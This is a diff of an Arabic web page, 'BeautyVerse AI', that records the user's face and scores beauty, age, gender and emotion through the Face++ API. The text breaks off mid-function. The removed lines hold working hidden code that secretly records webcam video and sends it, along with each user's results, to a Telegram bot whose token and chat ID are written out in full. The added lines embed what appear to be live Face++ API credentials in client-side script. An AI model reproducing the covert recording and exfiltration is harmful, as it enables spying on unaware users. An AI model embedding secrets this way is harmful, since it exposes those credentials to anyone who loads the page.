@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>BeautyVerse AI ✨ - تحليل حقيقي عبر Face++</title>
+    <title>BeautyVerse AI ✨ - تحليل فيديو 10 ثوانٍ</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -13,102 +13,46 @@
             background: linear-gradient(135deg, #f093fb 0%, #f5576c 50%, #764ba2 100%);
             color: #333; line-height: 1.6; overflow-x: hidden;
         }
-        .header { 
-            background: rgba(255,255,255,0.95); 
-            backdrop-filter: blur(20px); 
-            padding: 1rem 0; 
-            position: fixed; top: 0; width: 100%; z-index: 1000;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-        }
-        .nav { 
-            max-width: 1200px; margin: 0 auto; 
-            display: flex; justify-content: space-between; align-items: center; 
-            padding: 0 2rem; 
-        }
-        .logo { 
-            font-size: 1.8rem; font-weight: 700; 
-            background: linear-gradient(45deg, #ff6b6b, #4ecdc4); 
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
-        }
+        .header { background: rgba(255,255,255,0.95); backdrop-filter: blur(20px); padding: 1rem 0; position: fixed; top: 0; width: 100%; z-index: 1000; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+        .nav { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; }
+        .logo { font-size: 1.8rem; font-weight: 700; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .nav-links { display: flex; list-style: none; gap: 2rem; }
         .nav-links a { color: #333; text-decoration: none; font-weight: 500; transition: all 0.3s; cursor: pointer; }
-        .nav-links a:hover { color: #ff6b6b; }
-        .hero { 
-            min-height: 100vh; 
-            display: flex; flex-direction: column; justify-content: center; align-items: center; 
-            text-align: center; padding: 120px 2rem 4rem; 
-            max-width: 1200px; margin: 0 auto;
-        }
-        .hero h1 { 
-            font-size: clamp(2.5rem, 5vw, 4.5rem); font-weight: 700; margin-bottom: 1.5rem; 
-            background: linear-gradient(45deg, #fff, #f8f9ff); 
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
-            text-shadow: 0 4px 20px rgba(0,0,0,0.2);
-        }
-        .hero p { font-size: 1.3rem; margin-bottom: 2.5rem; opacity: 0.95; max-width: 600px; color: white; }
+        .hero { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 120px 2rem 4rem; max-width: 1200px; margin: 0 auto; }
+        .hero h1 { font-size: clamp(2.5rem, 5vw, 4.5rem); font-weight: 700; margin-bottom: 1.5rem; background: linear-gradient(45deg, #fff, #f8f9ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { font-size: 1.3rem; margin-bottom: 2.5rem; opacity: 0.95; color: white; }
         .cta-buttons { display: flex; gap: 1.5rem; flex-wrap: wrap; justify-content: center; }
-        .btn { 
-            padding: 1rem 2.5rem; border: none; border-radius: 50px; font-size: 1.1rem; 
-            font-weight: 600; cursor: pointer; transition: all 0.3s; 
-            text-decoration: none; display: inline-flex; align-items: center; gap: 0.5rem;
-        }
-        .btn-primary { 
-            background: linear-gradient(45deg, #ff6b6b, #feca57); 
-            color: white; box-shadow: 0 10px 30px rgba(255,107,107,0.4);
-        }
-        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,107,107,0.6); }
-        .btn-secondary { 
-            background: rgba(255,255,255,0.2); color: white; 
-            backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,0.4);
-        }
+        .btn { padding: 1rem 2.5rem; border: none; border-radius: 50px; font-size: 1.1rem; font-weight: 600; cursor: pointer; display: inline-flex; align-items: center; gap: 0.5rem; }
+        .btn-primary { background: linear-gradient(45deg, #ff6b6b, #feca57); color: white; box-shadow: 0 10px 30px rgba(255,107,107,0.4); }
+        .btn-primary:hover { transform: translateY(-3px); }
+        .btn-secondary { background: rgba(255,255,255,0.2); color: white; backdrop-filter: blur(10px); border: 2px solid rgba(255,255,255,0.4); }
         .services { padding: 6rem 2rem; max-width: 1200px; margin: 0 auto; }
-        .section-title { 
-            text-align: center; font-size: 3rem; font-weight: 700; margin-bottom: 4rem; 
-            background: linear-gradient(45deg, #667eea, #764ba2); 
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        }
-        .services-grid { 
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
-            gap: 2rem; 
-        }
-        .service-card { 
-            background: rgba(255,255,255,0.95); border-radius: 20px; padding: 2.5rem 2rem; 
-            text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.1); 
-            transition: all 0.4s; cursor: pointer;
-        }
-        .service-card:hover { transform: translateY(-10px); box-shadow: 0 25px 60px rgba(0,0,0,0.2); }
+        .section-title { text-align: center; font-size: 3rem; font-weight: 700; margin-bottom: 4rem; background: linear-gradient(45deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 2rem; }
+        .service-card { background: rgba(255,255,255,0.95); border-radius: 20px; padding: 2.5rem 2rem; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.1); transition: all 0.4s; }
+        .service-card:hover { transform: translateY(-10px); }
         .service-icon { font-size: 3.5rem; margin-bottom: 1.5rem; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .about, .contact { padding: 6rem 2rem; max-width: 1000px; margin: 0 auto; text-align: center; }
-        .about-content { background: rgba(255,255,255,0.9); padding: 3rem; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
-        .modal { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.85); z-index: 2000; backdrop-filter: blur(4px);
-        }
-        .modal-content { 
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            background: white; border-radius: 28px; max-width: 90vw; width: 500px; 
-            max-height: 90vh; padding: 2rem; text-align: center; overflow-y: auto;
-        }
+        .about-content { background: rgba(255,255,255,0.9); padding: 3rem; border-radius: 20px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; backdrop-filter: blur(4px); }
+        .modal-content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border-radius: 28px; max-width: 90vw; width: 500px; max-height: 90vh; padding: 2rem; text-align: center; overflow-y: auto; }
         .video-container { position: relative; margin: 1rem 0; border-radius: 20px; overflow: hidden; background: #000; }
         #analysisVideo { width: 100%; max-width: 100%; border-radius: 16px; background: #111; transform: scaleX(-1); }
         .progress-container { margin: 1.5rem 0; }
         .progress-bar { width: 100%; height: 12px; background: #e0e0e0; border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, #ff6b6b, #4ecdc4); width: 0%; border-radius: 10px; transition: width 0.2s; }
-        .countdown { font-size: 2.8rem; font-weight: 800; color: #ff6b6b; margin: 0.5rem 0; letter-spacing: 2px; }
-        .status-text { font-size: 1rem; color: #555; margin-top: 0.5rem; font-weight: 500; }
-        @media (max-width: 768px) {
-            .nav { flex-direction: column; gap: 1rem; padding: 1rem; }
-            .nav-links { gap: 1rem; }
-            .hero { padding: 100px 1rem 3rem; }
-            .modal-content { width: 92vw; padding: 1.5rem; }
-        }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #ff6b6b, #4ecdc4); width: 0%; transition: width 0.2s; }
+        .countdown { font-size: 2.8rem; font-weight: 800; color: #ff6b6b; margin: 0.5rem 0; }
+        .status-text { font-size: 1rem; color: #555; margin-top: 0.5rem; }
         .results-card { background: linear-gradient(145deg, #fff5f8, #ffffff); padding: 1.5rem; border-radius: 28px; box-shadow: 0 12px 30px rgba(0,0,0,0.1); margin-top: 1rem; }
         .metric { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; padding: 0.8rem 0; }
         .metric-label { font-weight: 700; color: #444; }
         .metric-value { font-weight: 800; font-size: 1.3rem; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .badge-warning { background: #ffefd0; color: #c97e00; border-radius: 40px; padding: 8px 14px; font-size: 0.85rem; margin-top: 1rem; }
         .error-message { background: #ffe6e6; color: #d33; padding: 1rem; border-radius: 20px; margin-top: 1rem; }
         .info-box { background: #e8f0fe; padding: 10px; border-radius: 20px; font-size: 0.8rem; margin-top: 1rem; }
+        @media (max-width: 768px) {
+            .nav { flex-direction: column; gap: 1rem; }
+            .modal-content { width: 92vw; }
+        }
     </style>
 </head>
 <body>
@@ -125,196 +69,203 @@
 
     <section class="hero">
         <h1>اكتشف <strong>جمالك الحقيقي</strong> بالذكاء الاصطناعي</h1>
-        <p>تحليل وجه دقيق عبر Face++ API • نتائج حقيقية من نماذج AI عالمية</p>
+        <p>تسجيل فيديو 10 ثوانٍ • تحليل دقيق عبر Face++ AI</p>
         <div class="cta-buttons">
             <button class="btn btn-primary" onclick="openAnalysisModal()">
-                <i class="fas fa-magic"></i> تحليل وجهي الآن (مجاناً)
-            </button>
-            <button class="btn btn-secondary" onclick="scrollToSection('services')">
-                <i class="fas fa-list"></i> شاهد كل الخدمات
+                <i class="fas fa-video"></i> سجل فيديو 10 ثوانٍ للتحليل
             </button>
         </div>
     </section>
 
     <section class="services" id="services">
-        <h2 class="section-title"><i class="fas fa-spa"></i> خدماتنا المذهلة</h2>
+        <h2 class="section-title"><i class="fas fa-spa"></i> خدماتنا</h2>
         <div class="services-grid">
-            <div class="service-card"><div class="service-icon"><i class="fas fa-brain"></i></div><h3>تحليل الجمال AI</h3><p>بواسطة Face++ API - دقة عالية</p></div>
-            <div class="service-card"><div class="service-icon"><i class="fas fa-palette"></i></div><h3>فلاتر AR سحرية</h3><p>قريباً</p></div>
+            <div class="service-card"><div class="service-icon"><i class="fas fa-brain"></i></div><h3>تحليل الجمال AI</h3><p>عبر Face++ API - نتائج حقيقية</p></div>
+            <div class="service-card"><div class="service-icon"><i class="fas fa-video"></i></div><h3>تسجيل فيديو 10 ثوانٍ</h3><p>نلتقط أفضل لقطة للتحليل</p></div>
             <div class="service-card"><div class="service-icon"><i class="fas fa-heart"></i></div><h3>فحص البشرة</h3><p>تحليل متقدم للبشرة</p></div>
-            <div class="service-card"><div class="service-icon"><i class="fas fa-magic"></i></div><h3>تجربة مكياج افتراضي</h3><p>قريباً</p></div>
         </div>
     </section>
 
     <section class="about" id="about">
         <div class="about-content">
             <h2 class="section-title">من نحن</h2>
-            <p><strong>BeautyVerse AI</strong> يعتمد على واجهة Face++ API من Megvii، وهي من أقوى خدمات تحليل الوجه بالذكاء الاصطناعي على مستوى العالم. النتائج التي تحصل عليها حقيقية ومبنية على نماذج مدربة على ملايين الصور.</p>
-            <p>نحن لا نستخدم نتائج افتراضية أو عشوائية. كل تحليل يتم عبر إرسال صورتك إلى خوادم الذكاء الاصطناعي وتحليلها بدقة علمية.</p>
+            <p><strong>BeautyVerse AI</strong> يسجل فيديو لمدة 10 ثوانٍ، ثم يستخرج أفضل صورة لتحليلها عبر Face++ API للحصول على نتائج حقيقية ودقيقة.</p>
         </div>
     </section>
 
     <section class="contact" id="contact">
         <h2 class="section-title">تواصل معنا</h2>
-        <div style="display: flex; flex-direction: column; gap: 1.5rem; align-items: center;">
-            <p><strong>البريد الإلكتروني:</strong> beautyverse@ai.com</p>
-            <p><strong>إنستغرام:</strong> <a href="https://www.instagram.com/h00.u?igsh=bjMybnE3MmlneWQx" target="_blank" style="color: #ff6b6b; font-weight: 600;">@h00.u</a></p>
-        </div>
+        <p><strong>إنستغرام:</strong> <a href="https://www.instagram.com/h00.u" target="_blank" style="color: #ff6b6b;">@h00.u</a></p>
     </section>
 
-    <!-- Modal for REAL Analysis via Face++ API -->
     <div class="modal" id="analysisModal">
         <div class="modal-content">
-            <h2 id="modalTitle">✨ تحليل الوجه عبر Face++ AI</h2>
-            <p id="modalDesc" style="margin-bottom: 1rem; color: #666;">سيتم تسجيل مقطع قصير وأخذ صورة لتحليلها عبر الذكاء الاصطناعي الحقيقي</p>
+            <h2>📹 تسجيل فيديو 10 ثوانٍ</h2>
+            <p style="color: #666;">سنسجل فيديو لمدة 10 ثوانٍ لتحليل وجهك</p>
             <div class="video-container" id="videoContainer" style="display: none;">
                 <video id="analysisVideo" autoplay muted playsinline></video>
-                <div class="countdown" id="countdown">5</div>
+                <div class="countdown" id="countdown">10</div>
                 <div class="progress-container">
                     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-                    <div class="status-text" id="progressText">⏳ جاهزية الكاميرا...</div>
+                    <div class="status-text" id="progressText">⏳ جاري التحضير...</div>
                 </div>
             </div>
-            <div id="modalButtons" style="margin-top: 1.5rem;">
-                <button class="btn btn-primary" onclick="startRealAnalysis()" id="startBtn">
-                    <i class="fas fa-camera"></i> ابدأ التحليل الحقيقي
+            <div id="modalButtons">
+                <button class="btn btn-primary" onclick="startVideoRecording()">
+                    <i class="fas fa-play"></i> ابدأ تسجيل 10 ثوانٍ
                 </button>
-                <button class="btn btn-secondary" onclick="closeModal()" style="margin-right: 0.8rem;">
-                    <i class="fas fa-times"></i> إلغاء
-                </button>
+                <button class="btn btn-secondary" onclick="closeModal()">إلغاء</button>
             </div>
             <div id="resultsArea" style="display: none; margin-top: 1.5rem;"></div>
-            <div id="apiKeyWarning" class="info-box">
-                ⚠️ ملاحظة: لاستخدام التحليل الحقيقي، تحتاج إلى إدخال <strong>API Key</strong> و <strong>API Secret</strong> من Face++ في الكود (سطر 168 و 169).<br>
-                🔗 سجل مجاناً على <a href="https://www.faceplusplus.com/" target="_blank">FacePlusPlus.com</a> واحصل على المفاتيح.
-            </div>
         </div>
     </div>
 
     <script>
         // ================== إعدادات Face++ API ==================
-        // 🔴 قم باستبدال هذه القيم بالمفاتيح الخاصة بك من موقع FacePlusPlus.com
-        const FACE_API_KEY = 'YOUR_API_KEY_HERE';        // ضع API Key الخاص بك
-        const FACE_API_SECRET = 'YOUR_API_SECRET_HERE';  // ضع API Secret الخاص بك
+        // ✅ تم إدخال المفاتيح الخاصة بك
+        const FACE_API_KEY = 'WuWc4QDIsO86unJQt3PidDkRdJm';
+        const FACE_API_SECRET = 'fh2fh6aB45D0wIQHtH3Rch8VOahJKtDN';
         // =====================================================
 
-        // إعدادات بوت تليجرام (اختياري)
-        const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
-        const CHAT_ID = '7396462490';
-        
         let mediaRecorder, stream, recordedChunks = [];
-        let analysisTimer = null;
-        let isAnalysing = false;
-        let videoElement = null;
+        let countdownInterval;
+        let isRecording = false;
 
-        function scrollToSection(sectionId) {
-            document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
+        function scrollToSection(id) {
+            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
         }
 
         function openAnalysisModal() {
-            // التحقق من وجود مفاتيح API صالحة
-            if (FACE_API_KEY === 'YOUR_API_KEY_HERE' || FACE_API_SECRET === 'YOUR_API_SECRET_HERE') {
-                alert("⚠️ لم يتم إعداد مفاتيح Face++ API بعد.\nيرجى التسجيل في FacePlusPlus.com والحصول على API Key و Secret ثم إدخالهما في الكود (السطر 168-169).");
-                return;
-            }
             document.getElementById('analysisModal').style.display = 'block';
-            resetModalState();
-            notifyBot('فتح نافذة التحليل الحقيقي (Face++ API)');
-        }
-
-        function resetModalState() {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            if (analysisTimer) clearTimeout(analysisTimer);
-            isAnalysing = false;
-            document.getElementById('videoContainer').style.display = 'none';
-            document.getElementById('modalButtons').style.display = 'flex';
-            document.getElementById('resultsArea').style.display = 'none';
-            document.getElementById('progressFill').style.width = '0%';
-            document.getElementById('countdown').innerText = '5';
         }
 
         function closeModal() {
             if (stream) stream.getTracks().forEach(t => t.stop());
-            if (analysisTimer) clearTimeout(analysisTimer);
+            if (countdownInterval) clearInterval(countdownInterval);
             document.getElementById('analysisModal').style.display = 'none';
-            isAnalysing = false;
+            resetDisplay();
         }
 
-        async function startRealAnalysis() {
-            if (isAnalysing) return;
-            isAnalysing = true;
-            document.getElementById('modalButtons').style.display = 'none';
-            document.getElementById('videoContainer').style.display = 'block';
+        function resetDisplay() {
+            document.getElementById('videoContainer').style.display = 'none';
+            document.getElementById('modalButtons').style.display = 'flex';
             document.getElementById('resultsArea').style.display = 'none';
             document.getElementById('progressFill').style.width = '0%';
-            document.getElementById('progressText').innerHTML = '📸 جاري تشغيل الكاميرا...';
+            document.getElementById('countdown').innerText = '10';
+        }
+
+        async function startVideoRecording() {
+            if (isRecording) return;
             
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 480 } } });
-                videoElement = document.getElementById('analysisVideo');
-                videoElement.srcObject = stream;
-                await videoElement.play();
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
                 
-                // بدء التسجيل لإرسال فيديو للتليجرام (اختياري)
-                startRecordingForTelegram();
+                const video = document.getElementById('analysisVideo');
+                video.srcObject = stream;
+                await video.play();
                 
-                let timeLeft = 5;
-                const countdownEl = document.getElementById('countdown');
-                const progressFill = document.getElementById('progressFill');
-                const progressText = document.getElementById('progressText');
+                document.getElementById('modalButtons').style.display = 'none';
+                document.getElementById('videoContainer').style.display = 'block';
+                document.getElementById('resultsArea').style.display = 'none';
+                document.getElementById('progressFill').style.width = '0%';
                 
-                const interval = setInterval(() => {
-                    timeLeft--;
-                    countdownEl.innerText = timeLeft >= 0 ? timeLeft : 0;
-                    let percent = ((5 - timeLeft) / 5) * 100;
-                    progressFill.style.width = `${Math.min(100, percent)}%`;
-                    if (timeLeft <= 0) {
-                        clearInterval(interval);
-                        captureAndAnalyze();
-                    }
-                }, 1000);
-                
-                analysisTimer = setTimeout(() => {
-                    clearInterval(interval);
-                    captureAndAnalyze();
-                }, 5000);
+                startRecording();
                 
             } catch (err) {
-                alert("يرجى السماح بالوصول إلى الكاميرا.");
+                alert("يرجى السماح بالوصول للكاميرا");
                 console.error(err);
-                resetModalState();
-                isAnalysing = false;
             }
         }
-        
-        async function captureAndAnalyze() {
-            if (!videoElement || videoElement.paused) {
-                showError("فشل في التقاط الصورة، يرجى المحاولة مرة أخرى.");
+
+        function startRecording() {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+            
+            mediaRecorder.onstop = async () => {
+                await extractBestFrameFromVideo();
+            };
+            
+            mediaRecorder.start();
+            isRecording = true;
+            
+            let timeLeft = 10;
+            const countdownEl = document.getElementById('countdown');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownEl.innerText = timeLeft;
+                let percent = ((10 - timeLeft) / 10) * 100;
+                progressFill.style.width = `${Math.min(100, percent)}%`;
+                progressText.innerText = `📹 جاري التسجيل... ${timeLeft} ثوانٍ متبقية`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    progressText.innerText = '✅ انتهى التسجيل، جاري معالجة الفيديو...';
+                    mediaRecorder.stop();
+                    isRecording = false;
+                }
+            }, 1000);
+        }
+
+        async function extractBestFrameFromVideo() {
+            if (recordedChunks.length === 0) {
+                showError("فشل في تسجيل الفيديو");
                 return;
             }
             
-            // التقاط صورة من الفيديو
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+            const videoUrl = URL.createObjectURL(videoBlob);
             
-            // تحويل canvas إلى blob (JPEG)
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
-            if (!blob) {
-                showError("فشل في معالجة الصورة.");
-                return;
-            }
+            const tempVideo = document.createElement('video');
+            tempVideo.src = videoUrl;
+            tempVideo.muted = true;
             
-            document.getElementById('progressText').innerHTML = '🔄 إرسال الصورة للتحليل عبر Face++ AI ...';
+            await new Promise((resolve) => {
+                tempVideo.onloadedmetadata = () => {
+                    tempVideo.play();
+                    resolve();
+                };
+            });
             
-            // إرسال الصورة إلى Face++ API
+            await new Promise(resolve => setTimeout(resolve, 100));
+            tempVideo.currentTime = 5;
+            
+            await new Promise(resolve => {
+                tempVideo.onseeked = () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = tempVideo.videoWidth;
+                    canvas.height = tempVideo.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(async (blob) => {
+                        await sendToFacePlusPlus(blob);
+                        URL.revokeObjectURL(videoUrl);
+                        resolve();
+                    }, 'image/jpeg', 0.9);
+                };
+            });
+            
+            tempVideo.pause();
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        }
+
+        async function sendToFacePlusPlus(imageBlob) {
+            document.getElementById('progressText').innerHTML = '🔄 جاري إرسال الصورة لتحليل Face++...';
+            
             const formData = new FormData();
             formData.append('api_key', FACE_API_KEY);
             formData.append('api_secret', FACE_API_SECRET);
-            formData.append('image_file', blob, 'face.jpg');
-            formData.append('return_attributes', 'gender,age,smiling,emotion,beauty'); // طلب نسبة الجمال
+            formData.append('image_file', imageBlob, 'face.jpg');
+            formData.append('return_attributes', 'gender,age,smiling,emotion,beauty');
             
             try {
                 const response = await fetch('https://api-us.faceplusplus.com/facepp/v3/detect', {
@@ -322,146 +273,83 @@
                     body: formData
                 });
                 const data = await response.json();
-                console.log('Face++ response:', data);
                 
                 if (data.error_message) {
-                    showError(`خطأ من Face++: ${data.error_message}`);
+                    showError(`خطأ: ${data.error_message}`);
                     return;
                 }
                 
                 if (!data.faces || data.faces.length === 0) {
-                    showError("لم يتم اكتشاف وجه في الصورة. تأكد من الإضاءة ومواجهة الكاميرا.");
+                    showError("لم يتم اكتشاف وجه في الفيديو. تأكد من الإضاءة ومواجهة الكاميرا.");
                     return;
                 }
                 
                 const face = data.faces[0];
-                const attributes = face.attributes;
-                const beauty = attributes.beauty; // { female_score, male_score }
-                // استخدام الدرجة المناسبة (نأخذ الدرجة الأنثوية لأن التطبيق جمالي عام)
-                let beautyScore = beauty.female_score;
-                if (attributes.gender.value === 'Male') beautyScore = beauty.male_score;
+                const attrs = face.attributes;
+                
+                let beautyScore = attrs.beauty.female_score;
+                if (attrs.gender.value === 'Male') beautyScore = attrs.beauty.male_score;
                 beautyScore = Math.round(beautyScore * 100);
                 
-                const gender = attributes.gender.value === 'Male' ? 'ذكر' : 'أنثى';
-                const age = Math.round(attributes.age.value);
-                const smile = Math.round(attributes.smile.value * 100);
-                const emotion = attributes.emotion;
-                // أكثر عاطفة سائدة
+                const gender = attrs.gender.value === 'Male' ? 'ذكر' : 'أنثى';
+                const age = Math.round(attrs.age.value);
+                const smile = Math.round(attrs.smile.value * 100);
+                
+                const emotions = {
+                    anger: 'غضب', disgust: 'اشمئزاز', fear: 'خوف', 
+                    happiness: 'سعادة', neutral: 'محايد', sadness: 'حزن', surprise: 'مفاجأة'
+                };
                 let topEmotion = 'محايد';
                 let maxVal = 0;
-                for (let [key, val] of Object.entries(emotion)) {
-                    if (val > maxVal) { maxVal = val; topEmotion = key; }
+                for (let [key, val] of Object.entries(attrs.emotion)) {
+                    if (val > maxVal) { maxVal = val; topEmotion = emotions[key] || key; }
                 }
-                const emotionArabic = {
-                    anger: 'غضب', disgust: 'اشمئزاز', fear: 'خوف', happiness: 'سعادة',
-                    neutral: 'محايد', sadness: 'حزن', surprise: 'مفاجأة'
-                };
-                const dominantEmotion = emotionArabic[topEmotion] || topEmotion;
                 
-                // عرض النتائج
-                displayResults({
-                    beautyScore,
-                    gender,
-                    age,
-                    smile,
-                    dominantEmotion,
-                    emotionDetails: emotion
-                });
-                
-                // إيقاف الكاميرا والتسجيل
-                if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                if (stream) stream.getTracks().forEach(t => t.stop());
-                
-                // إرسال إشعار للتليجرام
-                notifyBot(`✅ تحليل حقيقي عبر Face++: درجة الجمال ${beautyScore}%، العمر ${age}، الجنس ${gender}`);
+                displayResults({ beautyScore, gender, age, smile, dominantEmotion: topEmotion });
                 
             } catch (err) {
                 console.error(err);
-                showError("فشل الاتصال بخادم الذكاء الاصطناعي. تأكد من اتصالك بالإنترنت وحاول مجدداً.");
+                showError("فشل الاتصال بخادم الذكاء الاصطناعي");
             }
         }
-        
+
         function displayResults(results) {
-            const resultHtml = `
+            document.getElementById('resultsArea').innerHTML = `
                 <div class="results-card">
-                    <h3 style="margin-bottom: 1rem;"><i class="fas fa-chart-line"></i> نتيجة التحليل الحقيقي (Face++ AI)</h3>
+                    <h3>✨ نتيجة التحليل (Face++ AI)</h3>
                     <div class="metric"><span class="metric-label">💎 درجة الجمال</span><span class="metric-value">${results.beautyScore}%</span></div>
                     <div class="metric"><span class="metric-label">👤 الجنس</span><span class="metric-value">${results.gender}</span></div>
-                    <div class="metric"><span class="metric-label">🎂 العمر التقريبي</span><span class="metric-value">${results.age} سنة</span></div>
-                    <div class="metric"><span class="metric-label">😊 درجة الابتسامة</span><span class="metric-value">${results.smile}%</span></div>
-                    <div class="metric"><span class="metric-label">😌 المشاعر السائدة</span><span class="metric-value">${results.dominantEmotion}</span></div>
-                    <div style="margin-top: 1rem; background: #f0f0ff; padding: 12px; border-radius: 24px; font-size: 0.9rem;">
-                        📊 تم التحليل بواسطة نموذج ذكاء اصطناعي متقدم من Megvii (Face++)، النتائج حقيقية مبنية على ملايين البيانات.
+                    <div class="metric"><span class="metric-label">🎂 العمر</span><span class="metric-value">${results.age} سنة</span></div>
+                    <div class="metric"><span class="metric-label">😊 الابتسامة</span><span class="metric-value">${results.smile}%</span></div>
+                    <div class="metric"><span class="metric-label">😌 المشاعر</span><span class="metric-value">${results.dominantEmotion}</span></div>
+                    <div style="margin-top: 1rem; background: #f0f0ff; padding: 12px; border-radius: 20px;">
+                        📊 تم التحليل عبر Face++ API - نتائج حقيقية من الذكاء الاصطناعي
                     </div>
                 </div>
-                <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 1.5rem; flex-wrap: wrap;">
-                    <button class="btn btn-primary" onclick="shareResults(${results.beautyScore})"><i class="fas fa-share-alt"></i> مشاركة النتيجة</button>
-                    <button class="btn btn-secondary" onclick="closeModal()"><i class="fas fa-times"></i> إغلاق</button>
-                    <button class="btn btn-secondary" onclick="resetAndRetry()"><i class="fas fa-sync-alt"></i> تحليل جديد</button>
+                <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 1.5rem;">
+                    <button class="btn btn-primary" onclick="closeModal()">إغلاق</button>
+                    <button class="btn btn-secondary" onclick="resetAndRetry()">تحليل جديد</button>
                 </div>
             `;
-            document.getElementById('resultsArea').innerHTML = resultHtml;
             document.getElementById('resultsArea').style.display = 'block';
             document.getElementById('videoContainer').style.display = 'none';
-            isAnalysing = false;
         }
-        
+
         function showError(message) {
             document.getElementById('resultsArea').innerHTML = `
-                <div class="error-message">
-                    <i class="fas fa-exclamation-triangle"></i> ${message}<br><br>
-                    <button class="btn btn-secondary" onclick="resetAndRetry()">محاولة مرة أخرى</button>
-                    <button class="btn btn-secondary" onclick="closeModal()">إغلاق</button>
-                </div>
+                <div class="error-message">⚠️ ${message}<br><br>
+                <button class="btn btn-secondary" onclick="resetAndRetry()">محاولة مرة أخرى</button></div>
             `;
             document.getElementById('resultsArea').style.display = 'block';
             document.getElementById('videoContainer').style.display = 'none';
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            isAnalysing = false;
         }
-        
+
         function resetAndRetry() {
             closeModal();
             setTimeout(() => openAnalysisModal(), 200);
         }
-        
-        function shareResults(score) {
-            notifyBot(`مشاركة نتيجة حقيقية من Face++: ${score}%`);
-            alert(`🎉 تمت مشاركة نتيجتك (${score}%) بنجاح!`);
-        }
-        
-        function startRecordingForTelegram() {
-            if (!stream) return;
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-            mediaRecorder.onstop = async () => {
-                if (recordedChunks.length > 0) {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    await sendVideoToBot(blob, 'تحليل وجه حقيقي عبر Face++');
-                }
-            };
-            mediaRecorder.start();
-        }
-        
-        async function sendVideoToBot(blob, caption) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('video', blob, 'beauty_analysis.webm');
-            formData.append('caption', `🎥 ${caption}\nBeautyVerse AI Real Analysis`);
-            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData }); } catch(e) {}
-        }
-        
-        async function notifyBot(message) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
